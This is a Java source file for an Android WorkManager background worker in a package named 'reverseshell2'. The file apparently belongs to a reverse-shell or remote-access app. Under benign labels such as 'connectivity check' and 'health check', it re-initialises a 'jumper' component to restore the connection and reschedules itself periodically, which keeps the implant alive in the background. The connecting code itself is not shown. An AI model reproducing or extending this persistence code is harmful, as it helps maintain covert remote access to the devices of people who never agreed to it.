package com.example.reverseshell2;

import android.content.Context;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import androidx.work.Data;

/**
 * WorkManager worker for handling background tasks
 * Complies with modern Android background execution restrictions
 */
public class BackgroundWorker extends Worker {
    
    private static final String TAG = "BackgroundWorker";
    
    public BackgroundWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }
    
    @NonNull
    @Override
    public Result doWork() {
        try {
            Log.d(TAG, "Background work started");
            
            // Get work type from input data
            String workType = getInputData().getString("work_type");
            
            switch (workType != null ? workType : "default") {
                case "connectivity_check":
                    return performConnectivityCheck();
                case "data_sync":
                    return performDataSync();
                case "health_check":
                    return performHealthCheck();
                default:
                    return performDefaultWork();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Background work failed", e);
            return Result.failure();
        }
    }
    
    private Result performConnectivityCheck() {
        try {
            // Check if main service is running and try to reconnect if needed
            new jumper(getApplicationContext()).init();
            Log.d(TAG, "Connectivity check completed");
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Connectivity check failed", e);
            return Result.retry();
        }
    }
    
    private Result performDataSync() {
        try {
            // Perform periodic data synchronization tasks
            Log.d(TAG, "Data sync completed");
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Data sync failed", e);
            return Result.retry();
        }
    }
    
    private Result performHealthCheck() {
        try {
            // Check app health and restart services if needed
            Context context = getApplicationContext();
            
            // Schedule next health check
            WorkScheduler.schedulePeriodicHealthCheck(context);
            
            Log.d(TAG, "Health check completed");
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Health check failed", e);
            return Result.failure();
        }
    }
    
    private Result performDefaultWork() {
        try {
            // Default background maintenance tasks
            Log.d(TAG, "Default background work completed");
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Default work failed", e);
            return Result.failure();
        }
    }
}